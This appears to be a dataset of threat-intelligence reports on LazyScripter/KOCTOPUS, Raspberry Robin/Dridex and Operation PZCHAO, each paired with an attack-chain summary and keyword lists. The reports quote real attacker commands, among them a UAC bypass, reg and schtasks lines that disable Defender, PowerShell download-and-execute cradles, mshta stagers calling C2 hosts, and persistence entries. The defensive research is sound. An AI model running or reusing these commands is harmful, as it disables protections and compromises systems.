eventvwr.exe is executed it looks for mmc.exe in these two registry locations:HKCU\Software\Classes\mscfile\shell\open\command HKCR\mscfile\shell\open\commandSince the first registry key does not exist then mmc.exe is executed from the second location to load the eventvwr.msc file in order to display the information to the user. An attacker can create this registry key that doesn’t exist in order to execute malicious commands with administrative privileges. In this case the actor has created this registry key with the same PowerShell command as described in the fodhelper.exe bypass.reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""cmd.exe /c powershell -WindowStyle Hidden -command \""IEX (New-Object 'C:\Users\Public\Libraries\sc.bat');\"" C:\Users\Public\Libraries\sc.bat"" /f16The downloaded batch file (sc.bat) has also been obfuscated using the BatchEncryption tool. After deobfuscation we can see this batch performs the following steps:• Using reg.exe to disable, add or delete all registry keys related to Microsoft Defender and MicrosoftSecurity Essentials. Also, it disables all the Scheduled tasks related to these security products by calling schtasks:reg delete ""HKLM\Software\Policies\Microsoft\Windows Defender"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG_DWORD /d ""0"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""1"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""0"" /f reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""0"" /f reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v ""Start"" /t REG_DWORD /d ""0"" /f reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger"" /v ""Start"" /t REG_DWORD /d ""0"" /f schtasks /Change /TN ""Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /Disable schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run "" /v ""Windows Defender"" /f reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""Windows Defender"" /f reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""WindowsDefender"" /f reg delete ""HKCR\*\shellex\ContextMenuHandlers\EPP"" /f17reg delete ""HKCR\Directory\shellex\ContextMenuHandlers\EPP"" /f reg delete ""HKCR\Drive\shellex\ContextMenuHandlers\EPP"" /f reg add ""HKLM\System\CurrentControlSet\Services\WdBoot"" /v ""Start"" /t REG_DWORD /d ""4"" /f reg add ""HKLM\System\CurrentControlSet\Services\WdFilter"" /v ""Start"" /t REG_DWORD /d ""4"" /f reg add ""HKLM\System\CurrentControlSet\Services\WdNisDrv"" /v ""Start"" /t REG_DWORD /d ""4"" /f reg add ""HKLM\System\CurrentControlSet\Services\WdNisSvc"" /v ""Start"" /t REG_DWORD /d ""4"" /f reg add ""HKLM\System\CurrentControlSet\Services\WinDefend"" /v ""Start"" /t REG_DWORD /d ""4"" /f reg add ""HKLM\System\CurrentControlSet\Services\SecurityHealthService"" /v ""Start"" /t REG_DWORD /d ""4"" /f reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f reg add ""HKLM\System\CurrentControlSet\Services\SecurityHealthService"" /v ""Start"" /t REG_DWORD /d ""4"" /f reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f•Calling PowerShell.exe to download another batch file. The actor has used another URL shortener “is.gd” which redirects to a Github repository to download that batch file:powershell -WindowStyle Hidden -command ""IEX (New-Object Net.WebClient).DownloadFile('url s\pus.bat');"" C:\Users\Public\Libraries\pus.batThe pus.bat script is also obfuscated by the BatchEncryption tool and executes the following PowerShell command. This command connects to its server to deploy its first multi-stage RAT which is Octopus:powershell -w hidden ""Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('url gateway.net:80/hpjs.php');""•Performing the following actions which in fact make both Octopus and Koadic persistence through both the AutoRun registry key and scheduled task.Koadic Persistence:reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""#OneDrive"" /t REG_SZ /d ""cmd /c powershell -w hidden \""Add-Type - AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('url gateway.net:80/hpjs.php');\""""Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile - noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta url gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} ""C:\WINDOWS\system32\schtasks.exe"" /create /TN AutomaticChromeUpdater /TR ""mshta url"" /SC minute /mo 6018Octopus Persistence:reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""New Value #1"" /t REG_SZ /d ""mshta url gateway.net:8080/MicrosoftUpdate"" /f powershell Add-MpPreference - ExclusionPath ""C:"" -FORCEPowershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile - noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticU /TR 'C:\Users\Public\Libraries\pus.bat' /SC minute /mo 120} ""C:\WINDOWS\system32\schtasks.exe"" /create /TN AutomaticU /TR C:\Users\Public\Libraries\pus.bat /SC minute /mo 120The first PowerShell command downloads the Octopus PowerShell agent from the following URL: url This agent has been obfuscated by the attacker.The Octopus agent is responsible for communicating with its C&C server to send and receive commands. To start its communications, it collects the following information from the victim machine:Figure 18: Loading Koadic• Host name (with the addition of five random characters to the end)• User name (if the user name has the administrator role it adds “*” to it)• OS version• OS architecture•The process id that is executing this PowerShell script• Victim’s Network domainThen it builds a header with the following format:19$HEADER = ""$hostname, $username, $OS_version, $OS_arch, $process_id, $domain""In the next step, it encrypts the header using AES encryption and then encodes the generated encrypted header using Base64. The Key and IV for encryption are Base64 hardcoded.Then it sends an HTTP get request to its server with the generated header as authorization header field.Figure 19: Encryption functionFigure 20: Http get requestAfter sending the request, it goes into a loop to receive commands from the server. The received commands are specific to the victim and the generated URL is the combination of the C&C URL and generated host name. The received commands are Base64 encoded and AES encrypted and therefore it first decodes and decrypts the commands and then based on the commands it does the required actions.20Figure 21: CommandsHere is the list of commands:•False: If the command is False it does nothing.• Report: It collects victim’s info including list of all of the running processes, local IP address, OS version,last boot time, OS locale and current time and then encrypts and Base64 encodes them and sends them in the authorization HTTP field to the server.• Download: Upload the content of a specified file to the server.•reset-pc: It seems this feature is not still implemented.It also deploys another variant of Octopus agent through JavaScript (mshta url gateway[.]net:8080/hta). This script calls the PowerShell to download the Octopus agent.21Figure 22: Js scriptFigure 23: PowerShell command after deobfuscationAfter deploying Octopus it deploys Koadic by calling mshta:""mshta url"" /f powershell Add-MpPreference -ExclusionPath ""C:"" -FORCEThe actor has used mshta and rundll32.exe for Koadic stagers.""C:\Windows\System32\rundll32.exe"" url ;UGH09GLI5P=;\ \ \ \./mshtml,RunHTMLApplicationFigure 24 shows the downloaded first stage. This script defines 4 random strings with the following sizes: 101, 118, 97, and 108. These strings’ lengths have been used to build the “eval” by converting each string size number to char.In the next step the obfuscated script that will be executed by eval is deobfuscated by passing it to the deobfuscation function (jRclebKBKY). At the end that deobfuscated script is executed by calling eval.22Figure 24: Downloaded jsThe deobfuscated script collects the following information from the victim and then builds a URL and command and makes an HTTP request to the Koadic server.Figure 25: Deobfuscated js•Checks SeDebugPrivilege through “whoami /all” command• Gets OS version and Build by reading their relative registry locations• Gets group policy history through reading registry location• Gets processor architecture•Lists directories in temp folder• Gets the contents of the IP routing table by executing the “route print” command• Gets computer name and username• Gets Windows code page23Figure 26: Data collectionIn this case, we observed that Koadic acted as a downloader to download and execute RMS, LuminosityLink. In some other cases, the actor used Koadic to drop njRat, Remcos and Quasar RAT.""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -command ""& { (New-Object Net.WebClient).DownloadFile('url 'C:\Users\Public\Libraries\1.exe')};"" C:\Users\Public\Libraries\1.exe ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -command ""& { (New-Object Net.WebClient).DownloadFile('url};"" C:\Users\Public\Libraries\Setup-RMS.exe taskkill /f /im rutserv.exe taskkill /f /im rfusclient.exe reg delete ""HKLM\SYSTEM\Remote Manipulator System"" /f attrib +s +h ""C:\Windows\System32\vipcatalog"" cd C:\Windows\System32\vipcatalog\ ""rutserv.exe"" /silentinstall regedit /s regedit.reg ""rutserv.exe"" /start @exitNgrokWe have observed some other variants of KOCTOPUS where the actor first deployed a modified version of Invoke- Ngrok which is a PowerShell script that exposes local ports of a victim over the internet. This script has an embedded Base64 encoded payload that is decoded and stored in the Libraries directory pretending to be RuntimeBroker.exe. This dropped payload achieved persistence through the AutoRun registry key and a scheduled task.After deploying Ngrok, the loader has deployed both Octopus and Koadic RATs.25ADS-BackdoorFigure 27: Invoke NgrokIn another case, we observed that the actor has tried to use the ADS-Backdoor which is a backdoor persistent module of Nishang Framework. Nishang is an open-source PowerShell-based framework for offensive security, penetration testing, and red teaming.powershell.exe -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('url Checking -URL url -Arguments ""CHECK""""26Figure 28: ADS-BackdoorExecutable VariantWe were able to find 7 executables associated with KOCTOPUS. All of these executables have been compiled using Pure Basic and have the same compile date (February 1st 2018) and almost all of them were recently uploaded to VirusTotal.Having the same compile time might indicate that they have been developed or modified by an automated tool. After further analysis we identified that all of these samples have been generated using a Bat to Exe Converter tool. In fact, the actor has used a tool to convert its batch loader to an executable. The compile time is predefined in this application and does not show the right compilation time. We believe the right compilation time is around the time that the sample has been uploaded to VirusTotal.27Figure 29: Bat to exe convertorThe samples are using different names to pretend they are legitimate applications. Here are some of the names used by these samples:•••“IATA ONE ID.exe”: This has been distributed through a spam campaign on Jan 6th, 2021. It is using the IATA ONE ID icon to pretend it is that software. ONE ID is a fairly recent concept introduced by IATA for contactless identity management that leverages biometric technology. This indicates that this actor is constantly monitoring new IATA technologies to update its toolsets respectively.“BSPlinkUpdaterV4.exe”: Similar to the “IATA ONE ID” this has been specifically designed to target airlines that are using BSPLink software.“Federal Skilled Worker Program Eligible Occupations Canada Immigration and Visa Information Canada.exe”: This is designed to target people that are applying to the Canada skill worker program. The actor has used decoy documents from a Canada Immigration website (Figure 30 and Figure 31).28Figure 30: Decoy document29Figure 31: Decoy documentThe actor has used several different icons for these executables. Among them we observed one that is an old Malwarebytes icon possibly pretending to be our security software.30Figure 32: Used iconsThis Bat to Exe Converter encrypts the batch loader into its resource section. The executable loads the resource, decrypting its content and then executing the batch file.Here is the main process of this loader:•It creates a directory in the %APPDATA%/Temp directory and then creates a batch file in that directory. The name of the directory and batch files are generated randomly.Figure 33: Create Directory•It looks for resources by their hashes and loads them using the LoadResource API call. This executable contains 2 resources. One of them has been used to generate a key for the RC4 encryption algorithm. The other one is the batch file content that has been encrypted.31Figure 34: Load Resource••It generates the RC4 key from the resource.It decrypts the content of the other resource and writes it into that created batch file. (The encryption key is 6A2148ADADF8D6E529B08D8BD0800A85).•It calls cmd.exe to execute the generated bat file using CreateProcessW.Figure 35: RC4 decryption32Vbscript VariantThe KOCTOPUS vbscript variant has the same functionality as we mentioned in the batch variant with the difference that process execution has been started by a VBScript that calls wscript to execute a PowerShell command. This PowerShell command downloads the batch variant of KOCTOPUS. All of the VBScript files are obfuscated to make analysis more difficult. In the VBA variant, the actor has used the URL shortener cutt.ly to hide its real URL which in this case is a GitHub repository hosted at raw.githubusercontent.com.""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -WindowStyle Hidden -command ""IEX (New-Object Net.WebClient).DownloadFile('url 'C:\Users\Public\Libraries\reguac.bat');"" C:\Users\Public\Libraries\reguac.batRegistry key variantThis variant sets the AutoRun registry key with a Powershell command that downloads and executes the batch variant of KOCTOPUS.EmpoderFiigure 36: Reg variantPrior to using Koadic as the main RAT this actor has used PowerShell Empire as its main toolset. To load PowerShell Empire the actor has used its Empire Loader which we call Empoder.Figure 37: WinRaR installerIn fact, the actor has just used a VBS file to load PowerShell Empire, but it has wrapped its VBS into a WinRar installer which is usually bundled with a decoy document. As an example, “Canada Visa.exe” is a WinRar installer that has two bundled files: a VBS file and a decoy PDF document. This one is specifically designed to target users of Canada Visa, a Canadian immigration law firm based in Montreal, Canada. The decoy document was taken from the Canada Visa website.33Figure 38: Canada Visa decoy document34InfrastructureThe actor has leveraged dynamic DNS providers for command-and-control communications. Dynamic DNS providers allow people to create free subdomains on shared domains and as you can see the actor has created five subdomains on four different dynamic DNS domains for the communications.•••••kasperskylab.ignorelist.comhpsj.firewall-gateway.netgooglechromeupdater.twilightparadox.comiatassl-telechargementsecurity.duckdns.orgstub.ignorelist.comFigure 39: Infrastructure35AttributionWe have examined TTPs, toolsets and infrastructure used by this actor to attribute it to any of the known threat actors.Even though some similarities between this actor and documented APT actors such as APT28 and OilRig exist, these indicators are not enough to attribute to any of these groups.• APT28 has used Koadic Rat in its past campaigns; the only similarity between them is the use of Koadicopen-source tool which is not a strong indicator to show any connections between them.• OilRig has used the batch to exe tool to convert its PowerShell scripts into executables. This is a good indicator that can show there is some overlap between this actor and OilRig but there are still some major differences between them that makes us believe they are separate groups.The most similar APT actor to the actor we analyzed in this report is Muddy Water. Here is the list of similarities between them:• Both have used Koadic and Empire in their previous campaigns• Both have used scripting languages such as PowerShell in their campaigns• Both have used GitHub to host their malicious payloads/scripts. Similar to Muddy Water this actor hasadded forks of some popular toolsets to add some legitimacy to its Github account• Both have used scheduled tasks and Registry Run Keys / Startup Folder for persistenceHowever, there are some key differences between them:• Muddy Water has employed targeted spear phishing attacks to perform its operations while this actorrelies on spam campaigns•This actor has employed several open-source frameworks and commercial malware such as Octopus, Nishang, Quasar, Remcos, njRAT, RMS, NetWire and LumosityLink RAT that have not been used by Muddy Water• Unlike Muddy Water that has used macro-weaponized maldocs, this actor has not used macro-embeddeddocuments and instead it directly embeds its loader within the maldocs• Muddy Water has used some custom toolsets such as PowerStats and SharpStats while this actor mainlyrelies on open-source toolsets to perform its operationsIn terms of used infrastructure, we have seen several APT groups that have used dynamic DNS for their C&C communications including Scarlet Mimic, Putter Panda, Turla, Patchwork and APT33. More specifically Scarlet Mimic and Putter Panda have used the same free DNS provider “firewall-gateway.net” for their C&C communications. Still, we have not found any other similarities between these APTs and the actor we analyzed in this report except using a free DNS provider which is not reliable in the attribution process.Based on the differences we provided in this section we believe this is a new actor that has not been documented before and therefore we have decided to track this actor as a new group that we call LazyScripter.36ConclusionIn this paper, we uncovered several campaigns associated to an actor group that we believe has been active since Visa_Information._Canad.pd ngr.ps1OChpjs.ps1 SUPPORT_KITS_USERS.pdf.b kasperskylab.ignorelist.com hpsj.firewall-gateway.net googlechromeupdater.twilightparadox.com iatassl-telechargementsecurity.duckdns.orgScheduled Task Names:WindowsVer AutomaticMozila41MITRE ATT&CK techniquesTactic Spear phishing attachment Spear phishing link Windows command shell Native API PowerShellT1053.005Scheduled TaskT1047 T1546.001 T1546.012Windows Management Instrumentation Change Default File Association Image File Execution Options InjectionT1543.003Windows ServicesT1547.001Registry Run Keys / Startup FolderT1053.005Scheduled TaskT1547.004Win Logon Helper DLLDetailsManual execution by user Manual execution by user Starts CMD.EXE for commands executionExecutes PowerShell scripts Loads the Task Scheduler DLL interface Uses Task Scheduler to run other applications powershell.exe executed via WMI reg.exe Changes default file association svchost.exe Changes Image File Execution Options Creates or modifies windows services Modifies Windows Defender service settings Changes the autorun value in the registry Loads the Task Scheduler DLL interface Uses Task Scheduler to run other applications Changes the login/logoff helper path in the registryT1548.002Bypass User Account ControlUses fodhelper and event viewer to bypass UACPrivilege EscalationT1546.012 Defense Evasion T1562.001Image File Execution Options Injection Disable or Modify Tools Windows File and Directory Permissions Bypass User Account Control Deobfuscate/Decode Files or InformationT1222.001T1112 T1140T1027Obfuscated Files or InformationChanges Image File Execution Options Modifies Windows Defender service settingsUses ATTRIB.EXE to modify file attributesUses REG.EXE to modify Windows registry Starts MSHTA.EXE for opening HTA or HTMLS files Uses RUNDLL32.EXE to load library Uses fodhelper and event viewer to bypass UAC Decodes Base64 and decrypts AES encrypted traffic Uses AES encryption Uses obfuscation tools Uses Base64 encoding Obtains list of running processes42DiscoveryT1057Process DiscoveryC&CExfiltrationT1082 T1041System Information Discovery System Network Configuration Discovery System Owner/User Discovery System Time Discovery Multi-Stage Channels Exfiltration Over C2 ChannelUse Base64 to encode the data Use AES encryption to encrypt the data43Malwarebytes Inc.3979Freedom Circle, 12th FloorSanta Clara, CA 95054USA+1 800 520 2796© 2021 Malwarebytes. All Rights Reserved. Any brand name is the property of its respective owner, is used for identification purposes only, and does not imply product endorsement or affiliation with Malwarebytes. ","1. Initial phishing emails with employment or IATA themes containing malicious documents or links. 2. Malicious documents or links download KOCTOPUS or EMPODER loader malware. 3. Loader installs multiple stages of open-source RATs like Octopus, Koadic, Empire. 4. RATs used for remote access, reconnaissance, credential harvesting. 5. Lateral movement through network via Windows commands and acquired credentials. 6. Compromise and abuse router VM to bypass network segmentation. 7. Use compromised router as proxy server for data exfiltration. 8. Use custom tunneling tools to create covert channels for data theft. 9. Exfiltrate stolen data to attacker controlled servers. ",valid_68,"['phishing emails', 'employment', 'IATA', 'themes', 'malicious documents', 'KOCTOPUS', 'EMPODER', 'Loader', 'IP', 'RATs', 'Koadic', 'Empire', 'remote access', 'network', 'Windows', 'commands', 'Compromise', 'Bypass', 'tools']",phishing emails; employment; IATA; themes; malicious documents; KOCTOPUS; EMPODER; Loader; IP; RATs; Koadic; Empire; remote access; network; Windows; commands; Compromise; Bypass; tools.
"securityintelligence.com /posts/raspberry-robin-worm-dridex-malware/ Raspberry Robin and Dridex: Two Birds of a FeatherIntelligence & Analytics September 1, 2022By Kevin Henson co-authored by Emmy Ebanks 8 min readIBM Security Managed Detection and Response (MDR) observations coupled with IBM Security X-Force malware research sheds additional light on the mysterious objectives of the operators behind the Raspberry Robin worm. Based on a comparative analysis between a downloaded Raspberry Robin DLL and a Dridex malware loader, the results show that they are similar in structure and functionality. Thus, IBM Security research draws another link between the Raspberry Robin infections and the Russia-based cybercriminal group ‘Evil Corp,’ which is the same group behind the Dridex Malware, suggesting that Evil Corp is likely using Raspberry Robin infrastructure to carry out its attacks.When Raspberry Robin infection attempts were first observed impacting a few IBM Security MDR customers in mid-May 2022, the enigmatic worm activity began to quickly spread within a client’s network from users sharing USB devices. The infections spiked in early June and by early August spikes of Raspberry Robin infection attempts were observed in 17% of worldwide MDR clients in the oil and gas, manufacturing, and transportation industries. This number is significant as historically less than 1% of MDR clients have seen the same strain of malware. Raspberry Robin and Evil Corp ConnectionThe ultimate objective of Raspberry Robin had been unknown. Microsoft researchers observed millions of Raspberry Robin infections, but no evidence of post-infection exploits had been seen in the wild until July1/1026, 2022, when Microsoftdisclosed that they had uncovered existing Raspberry Robin infections delivering FAKEUPDATES malware (aka SocGholish).The disclosure by the Microsoft threat researchers revealed that the “… DEV-0206-associated FAKEUPDATES activity on affected systems has since led to follow-on actions resembling DEV-0243 pre-ransomware behavior.” This statement indicates a possible relationship between Raspberry Robin and DEV-0243, which the cyber intelligence community tracks as “Evil Corp”.The relationship between the threat actor behind FAKEUPDATES and Evil Corp is not new. Evil Corp had been leveraging FAKEUPDATES since at least April 2018 as the initial infection vector for the info- stealing Dridex malware that later resulted in deployment of DOPPLEPAYMER ransomware.The US Treasury sanctioned Evil Corp in 2019 but the group had already begun deploying custom ransomware-as-a-service (RaaS) payloads, rebranding them as WastedLocker, before shifting to the well-known RaaS LockBit ransomware. Using RaaS allows Evil Corp to blend in with other affiliates that would hinder attribution and ultimately skirt around sanctions. Raspberry Robin Infection ChainRaspberry Robin, also known as the QNAP worm, is typically delivered by a USB device, which contains a malicious Microsoft shortcut (.LNK) file. Once the user clicks on the .LNK file, it spawns a malicious command referencing msiexec.exe, a legitimate Windows system utility, to download and execute an MSI installer from a command and control (C2) domain. The C2 domain is usually recently registered, comprised of a few characters, and hosts a compromised QNAP NAS device that serves up a login page.The msiexec commands observed by the IBM Security MDR team uses mixed-case syntax to evade detection, contain the victim’s hostname and username, and connect over a non-standard HTTP port 8080: Command Line: msieXeC /q /I ""S8 [.]Cx:8080/random string/coMpUTErname=USER""During the infection, msiexec.exe also utilizes other legitimate Windows system utilities and tools, known as living-off-the-land binaries (LOLBin) such as rundll32.exe, fodhelper.exe, regsvr32.exe, dllhost.exe, and odbcconf.exe to load and execute the downloaded Raspberry Robin loader dynamic link libraries (DLL). Representative samples of such DLLs were analyzed in-depth by IBM X-Force reverse engineers. X-Force Malware ResearchX-Force analyzed two components that have been attributed to a Raspberry Robin infection. The components are two dynamic link libraries (DLLs) hereafter referred to as Raspberry Robin loaders that were previously analyzed by Red Canary. As mentioned above, the loaders were downloaded as a result of a victim clicking a malicious .LNK file which launched msiexec to download and execute an MSI installer. The MSI Installer then drops a Raspberry Robin loader to the system. X-Force reverse engineers performed analysis to provide additional details about the operation and structure of Raspberry Robin loader variants and compared one variant to a 64-bit Dridex loader.2/10This comparative analysis provided information that helps draw a link between Raspberry Robin infections and Dridex malware loaders. The comparative analysis revealed that the two are very similar in functionality and structure. The intermediate loaders, decoded by each, were also found to be similar, containing code to perform hook detections and using similar algorithms to decode the payload.Analysis Details (Raspberry Robin Loaders)The Raspberry Robin loaders are DLLs that decode and execute an intermediate loader. The intermediate loader performs hook detection as an anti-analysis technique, decodes its strings at runtime and then decodes a highly obfuscated DLL whose purpose has not been determined.Raspberry Robin Loader Variant 1 (SHA256: an encrypted block of data for 0x13h (29) iterations. One theory is this calculation loop is possibly a delayed attempt as the loader does not appear to use the hash in any additional operations. During stage 1 of the payload decryption process, the DLL utilizes an array of indexes and sizes. Each index points to a block of the encrypted payload. The block is then shifted, and the result is later XOR decrypted with a 64-byte key.3/10Figure 1 — Structure of the decryption components and encrypted payload embedded in a Raspberry Robin LoaderAdditionally, the loader decodes the first 0x117 (279) bytes of its .text PE section starting at raw offset 0x400. The decoding algorithm is represented by the python code below: for b in data: key_byte = (key & 0xFF) dec.append(b ^ key_byte) key = rotate_right(key, 8)The decoded code finds the loaded kernel32.dll by enumerating through loaded modules looking for names that have a “.” as the 16th character and “32” starting at position 12 in the wide-formatted name. The loader continues execution passing the hash value 0xFC910371 and kernel32.dll’s base address to4/10a function that enumerates the library’s export table. This function calculates a hash of each exported function name to resolve the VirtualAlloc() API function.The function VirtualAlloc() is used to allocate a buffer to which the first decrypted payload is copied. The payload is then XOR decrypted with a 64-byte key.Raspberry Robin Loader Variant 2 (SHA256: wglGetProcAddress(). This variant attempts to detect hooks in the LdrLoadDll() function. This is performed as an anti-analysis technique that helps the malware determine if the process is being monitored by security software. Specifically, the intermediate loader checks for the jump instructions 0xFF25 and 0xB8.Figure 2 — Intermediate Loader’s hook detection functionThen it proceeds to create an 88-byte structure used to store data used during execution. This loader also contains obfuscated notable API function and library names which are decoded by subtracting each byte in the 16-byte key, 0xB6B6AF8660D4760385C431119F7DE2B6, from the encoded string byte.Next, the loader RC4 decrypts an intermediate loader using the 32-byte key: 0x300EAEBAAF2512BFA8B473A085005D629CA9D2A79A8BD924687C04D7605E3015.Once decrypted, the intermediate loader contains a malformed PE header. The malformed PE header is later patched with the appropriate values to allow execution of the module. Notably, the intermediate loader, discussed in the next section also patches the header of its payload during execution.Figure 3 — Decrypted intermediate Loader’s malformed PE header5/10Intermediate LoaderThe intermediate loader is responsible for decrypting and executing the final payload. Ultimately, the intermediate loader copies the final payload to the process space of the original loader, Raspberry Robin Loader variant 2 and then executes it.During execution, the intermediate loader decodes library and API function names using inline decoding algorithms and then resolves the function addresses via a call to LdrGetProcedureAddress(). The function LdrGetProcedureAddress() is obtained by enumerating ntdll.dll’s export table.Figure 4 — Inline decoding algorithm used to decode library and API function names.The decoded library and function names from the intermediate loader are shown below: Comparative Analysis (Raspberry Robin Loader vs. Dridex Loader)X-Force performed a comparative analysis of a 32-bit Raspberry Robin downloaded loader and a 64-bit Dridex loader. This comparative analysis provided information that draws a link between Raspberry Robin loaders and Dridex malware loaders. The comparative analysis revealed that the two are very similar in functionality and structure. The intermediate loaders decoded the final payload in a similar manner and Subsequently, values such as the encrypted payload offset and size are assigned to a structure as shown below.Figure 8 — Values assigned to a structure. The values represent the size and offset of the payloadThe PE header of the decrypted components is malformed in memory. As a result, the malware “fixes” the component to have the proper header by adding the “MZ (0x4D5A)” magic bytes to the header.8/10Figure 9 — Malformed header is patched with the appropriate values Intermediate Loader ComparisonsThe intermediate loaders between the two are similar containing code to perform hook detection in the LdrLoadDll() function. Detecting hooks in the function allows the malware to determine if the process is being monitored by antivirus software.The final payload is also decoded using the algorithm represented by the following Python code: decrypted_payload = bytearray(payload) index = 0 size = len(payload) while index != 254: payload_idx = lookup_table[index*4] while True: if payload_idx >= size: break key_idx = payload_idx & 0x1F key_byte = key[key_idx] decrypted_byte = (payload[payload_idx] - key_byte) & 0xFF decrypted_payload[payload_idx] = decrypted_byte9/10payload_idx += 0xFF index += 1 RecommendationsIt is important to note that Raspberry Robin’s initial access is by the user plugging in an infected USB drive to a computer, which is a social engineering technique. The IBM Security MDR team tools effectively block Raspberry Robin. Further, there are multiple detection opportunities for Security professionals to help organizations to detect and prevent Raspberry Robin:Implement security awareness training. Search for the IOCs in your environment. Install/Deploy EDR monitoring solutions. Leverage your EDR solution to disable or track USB devices connections. Disable the AutoRun feature in the Windows operating system settings.IOCs File HashesRaspberry Robin Loader Variant 1 Raspberry Robin Loader Variant 2 msieXeC /q /I ""S8 [.]Cx:8080/random string/coMpUTErname=USER""10/10 ","1. Evil Corp threat actors create malicious .LNK files on USB devices. 2. A user inserts an infected USB device into a computer. 3. The user clicks on the malicious .LNK file on the USB device. 4. The .LNK file executes a command to download a Raspberry Robin loader DLL using living-off-the-land binaries like msiexec. 5. The downloaded Raspberry Robin loader DLL decrypts and executes an intermediate loader. 6. The intermediate loader detects hooks, decodes strings, and decrypts the final Raspberry Robin payload. 7. The final payload executes its unknown malicious activities. 8. In some cases, the Raspberry Robin payload installs FAKEUPDATES malware. 9. FAKEUPDATES can download Dridex malware or other tools used by Evil Corp. 10. Dridex steals credentials and enables further access for deployment of ransomware. 11. Evil Corp monetizes via data theft, ransomware, or compromised access. 12. Obfuscation and encryption of Raspberry Robin loaders evades security products. ",valid_5,"['Evil Corp', 'USB devices', 'an infected USB', 'a computer', 'the user', 'the .LNK file', 'a command', 'a Raspberry Robin loader', 'DLL', 'the-land', 'msiexec', 'the downloaded Raspberry Robin', 'an intermediate loader', 'the intermediate loader', 'hooks', 'code', 'the final payload', 'Install', 'FAKEUPDATES malware', 'Dridex malware', 'tools', '10', 'access', 'deployment', 'ransomware', '11', 'data', '12', 'Raspberry Robin loaders']",Evil Corp; USB devices; an infected USB; a computer; the user; the .LNK file; a command; a Raspberry Robin loader; DLL; the-land; msiexec; the downloaded Raspberry Robin; an intermediate loader; the intermediate loader; hooks; code; the final payload; Install; FAKEUPDATES malware; Dridex malware; tools; 10; access; deployment; ransomware; 11; data; 12; Raspberry Robin loaders.
"Operation PZCHAOInside a highly specialized espionageinfrastructureWhitepaperForeword More than 30 years after the end of the Cold War, digital infrastructures worldwide have become strategic national fronts with the same importance as the geographical frontiers of air, land, sea and space.At the same time, cyber-attacks are growing in complexity as threat actors divide payloads in multiple modules with highly specialized uses to achieve a target’s compromise. The past few years have seen high-proﬁ le cyber-attacks shift to damaging the targets’ digital infrastructures to stealing highly sensitive data, silently monitoring the victim and constantly laying the ground for a new wave of attacks.This is also the case of a custom-built piece of malware that we have been monitoring for several months as it wrought havoc in Asia. Our threat intelligence systems picked up the ﬁ rst indicators of compromise in July last year, and we have kept an eye on the threat ever since.An interesting feature of this threat, which drew our team to the challenge of analyzing it, is that it features a network of malicious subdomains, each one used for a speciﬁ c task (download, upload, RAT related actions, malware DLL delivery). The payloads are diversiﬁ ed and include capabilities to download and execute additional binary ﬁ les, collect private information and remotely execute commands on the system.In the analysis process, we managed to retrieve the malware payloads hosted on one of the command and control servers along with some statistics, such as the total number of downloads and logs containing the targeted victims. Among the most-downloaded malicious ﬁ les, we found variants of Gh0st RAT used 